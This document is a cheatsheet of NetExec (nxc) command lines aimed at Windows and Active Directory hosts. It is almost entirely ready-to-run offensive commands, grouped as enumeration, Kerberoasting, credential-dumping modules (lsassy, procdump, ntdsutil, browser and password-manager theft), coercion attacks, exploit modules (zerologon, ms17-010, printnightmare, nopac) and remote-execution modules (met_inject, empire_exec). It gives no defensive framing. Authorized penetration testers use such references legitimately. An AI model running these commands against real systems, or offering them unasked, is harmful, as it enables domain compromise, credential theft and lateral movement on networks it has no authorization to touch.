# Netexec (nxc) Cheatsheet

---

## Enumerate

```powershell
nxc smb 192.168.0.0/24
nxc smb 192.168.0.10 -u 'user' -p 'password'
nxc smb 192.168.0.10 -u 'user' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
nxc smb 192.168.0.10 -u users.txt -p 'password' --continue-on-success
nxc smb 192.168.0.10 -u 'user' -p 'password' --local-auth
nxc smb 192.168.0.10 -u 'user' -p 'password' --lsa
nxc smb 192.168.0.10 -u 'user' -p 'password' --shares
nxc smb 192.168.0.10 -u 'user' -p 'password' --users
nxc smb 192.168.0.10 -u 'user' -p 'password' --groups
nxc smb 192.168.0.10 -u 'user' -p 'password' --computers
nxc smb 192.168.0.10 -u 'user' -p 'password' --sessions
nxc smb 192.168.0.10 -u 'user' -p 'password' --loggedon-users
nxc smb 192.168.0.10 -u 'user' -p 'password' --pass-pol
nxc mssql 192.168.0.10 -u 'user' -p 'password' -x 'whoami'
nxc ldap 192.168.0.10 -u 'user' -p 'password' --kerberoasting kerb_hashes
nxc ldap 192.168.0.10 -u 'user' -p 'password' --asreproast asrep_hashes
```

---

## Enumeration Modules

```powershell
nxc smb 192.168.0.10 -u 'user' -p 'password' -M whoami
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_av
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_ca
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_dns
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_logins
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_trusts
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_impersonate
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_links
nxc smb 192.168.0.10 -u 'user' -p 'password' -M get-desc-users
nxc smb 192.168.0.10 -u 'user' -p 'password' -M user-desc
nxc smb 192.168.0.10 -u 'user' -p 'password' -M get-network
nxc smb 192.168.0.10 -u 'user' -p 'password' -M get_netconnections
nxc smb 192.168.0.10 -u 'user' -p 'password' -M get-unixUserPassword
nxc smb 192.168.0.10 -u 'user' -p 'password' -M get-userPassword
nxc smb 192.168.0.10 -u 'user' -p 'password' -M group-mem
nxc smb 192.168.0.10 -u 'user' -p 'password' -M groupmembership
nxc smb 192.168.0.10 -u 'user' -p 'password' -M subnets
nxc smb 192.168.0.10 -u 'user' -p 'password' -M spider_plus
nxc smb 192.168.0.10 -u 'user' -p 'password' -M hash_spider
nxc smb 192.168.0.10 -u 'user' -p 'password' -M find-computer
nxc smb 192.168.0.10 -u 'user' -p 'password' -M ldap-checker
nxc smb 192.168.0.10 -u 'user' -p 'password' -M ioxidresolver
nxc smb 192.168.0.10 -u 'user' -p 'password' -M recent_files
nxc smb 192.168.0.10 -u 'user' -p 'password' -M obsolete
nxc smb 192.168.0.10 -u 'user' -p 'password' -M pso
nxc smb 192.168.0.10 -u 'user' -p 'password' -M maq
nxc smb 192.168.0.10 -u 'user' -p 'password' -M spooler
nxc smb 192.168.0.10 -u 'user' -p 'password' -M webdav
nxc smb 192.168.0.10 -u 'user' -p 'password' -M iis
nxc smb 192.168.0.10 -u 'user' -p 'password' -M hyperv-host
nxc smb 192.168.0.10 -u 'user' -p 'password' -M add-computer
nxc smb 192.168.0.10 -u 'user' -p 'password' -M test_connection
nxc smb 192.168.0.10 -u 'user' -p 'password' -M security-questions
nxc smb 192.168.0.10 -u 'user' -p 'password' -M wcc
nxc smb 192.168.0.10 -u 'user' -p 'password' -M uac
nxc smb 192.168.0.10 -u 'user' -p 'password' -M remote-uac
nxc smb 192.168.0.10 -u 'user' -p 'password' -M runasppl
nxc smb 192.168.0.10 -u 'user' -p 'password' -M reg-query
nxc smb 192.168.0.10 -u 'user' -p 'password' -M reg-winlogon
nxc smb 192.168.0.10 -u 'user' -p 'password' -M pi
nxc smb 192.168.0.10 -u 'user' -p 'password' -M snipped
```

---

## Credential Harvesting Modules

```powershell
nxc smb 192.168.0.10 -u 'user' -p 'password' -M lsassy
nxc smb 192.168.0.10 -u 'user' -p 'password' -M handlekatz
nxc smb 192.168.0.10 -u 'user' -p 'password' -M nanodump
nxc smb 192.168.0.10 -u 'user' -p 'password' -M procdump
nxc smb 192.168.0.10 -u 'user' -p 'password' -M dpapi_hash
nxc smb 192.168.0.10 -u 'user' -p 'password' -M masky
nxc smb 192.168.0.10 -u 'user' -p 'password' -M gpp_password
nxc smb 192.168.0.10 -u 'user' -p 'password' -M gpp_autologin
nxc smb 192.168.0.10 -u 'user' -p 'password' -M wdigest
nxc smb 192.168.0.10 -u 'user' -p 'password' -M powershell_history
nxc smb 192.168.0.10 -u 'user' -p 'password' -M laps
nxc smb 192.168.0.10 -u 'user' -p 'password' -M wifi
nxc smb 192.168.0.10 -u 'user' -p 'password' -M veeam
nxc smb 192.168.0.10 -u 'user' -p 'password' -M keepass_discover
nxc smb 192.168.0.10 -u 'user' -p 'password' -M keepass_trigger
nxc smb 192.168.0.10 -u 'user' -p 'password' -M firefox
nxc smb 192.168.0.10 -u 'user' -p 'password' -M mobaxterm
nxc smb 192.168.0.10 -u 'user' -p 'password' -M mremoteng
nxc smb 192.168.0.10 -u 'user' -p 'password' -M putty
nxc smb 192.168.0.10 -u 'user' -p 'password' -M rdcman
nxc smb 192.168.0.10 -u 'user' -p 'password' -M winscp
nxc smb 192.168.0.10 -u 'user' -p 'password' -M teams_localdb
nxc smb 192.168.0.10 -u 'user' -p 'password' -M notepad++
nxc smb 192.168.0.10 -u 'user' -p 'password' -M bitlocker
nxc smb 192.168.0.10 -u 'user' -p 'password' -M ntdsutil
nxc smb 192.168.0.10 -u 'user' -p 'password' -M msol
nxc smb 192.168.0.10 -u 'user' -p 'password' -M wam
nxc smb 192.168.0.10 -u 'user' -p 'password' -M backup_operator
nxc smb 192.168.0.10 -u 'user' -p 'password' -M ntlmv1
nxc smb 192.168.0.10 -u 'user' -p 'password' -M drop-sc
```

---

## Active Directory Modules

```powershell
nxc smb 192.168.0.10 -u 'user' -p 'password' -M adcs
nxc smb 192.168.0.10 -u 'user' -p 'password' -M enum_ca
nxc smb 192.168.0.10 -u 'user' -p 'password' -M daclread
nxc smb 192.168.0.10 -u 'user' -p 'password' -M petitpotam
nxc smb 192.168.0.10 -u 'user' -p 'password' -M printerbug
nxc smb 192.168.0.10 -u 'user' -p 'password' -M shadowcoerce
nxc smb 192.168.0.10 -u 'user' -p 'password' -M dfscoerce
nxc smb 192.168.0.10 -u 'user' -p 'password' -M coerce_plus
nxc smb 192.168.0.10 -u 'user' -p 'password' -M mssql_coerce
nxc smb 192.168.0.10 -u 'user' -p 'password' -M mssql_priv
nxc smb 192.168.0.10 -u 'user' -p 'password' -M scuffy
nxc smb 192.168.0.10 -u 'user' -p 'password' -M slinky
nxc smb 192.168.0.10 -u 'user' -p 'password' -M pre2k
nxc smb 192.168.0.10 -u 'user' -p 'password' -M timeroast
nxc smb 192.168.0.10 -u 'user' -p 'password' -M sccm
nxc smb 192.168.0.10 -u 'user' -p 'password' -M link_enable_xp
nxc smb 192.168.0.10 -u 'user' -p 'password' -M link_xpcmd
nxc smb 192.168.0.10 -u 'user' -p 'password' -M exec_on_link
```

---

## Vulnerability Modules

```powershell
nxc smb 192.168.0.10 -u 'user' -p 'password' -M ms17-010
nxc smb 192.168.0.10 -u 'user' -p 'password' -M zerologon
nxc smb 192.168.0.10 -u 'user' -p 'password' -M printnightmare
nxc smb 192.168.0.10 -u 'user' -p 'password' -M nopac
nxc smb 192.168.0.10 -u 'user' -p 'password' -M smbghost
nxc smb 192.168.0.10 -u 'user' -p 'password' -M shadowrdp
nxc smb 192.168.0.10 -u 'user' -p 'password' -M install_elevated
nxc smb 192.168.0.10 -u 'user' -p 'password' -M remove-mic
```

---

## Execution & Lateral Movement Modules

```powershell
nxc smb 192.168.0.10 -u 'user' -p 'password' -M impersonate
nxc smb 192.168.0.10 -u 'user' -p 'password' -M met_inject
nxc smb 192.168.0.10 -u 'user' -p 'password' -M empire_exec
nxc smb 192.168.0.10 -u 'user' -p 'password' -M web_delivery
nxc smb 192.168.0.10 -u 'user' -p 'password' -M schtask_as
nxc smb 192.168.0.10 -u 'user' -p 'password' -M rdp
nxc smb 192.168.0.10 -u 'user' -p 'password' -M vnc
```
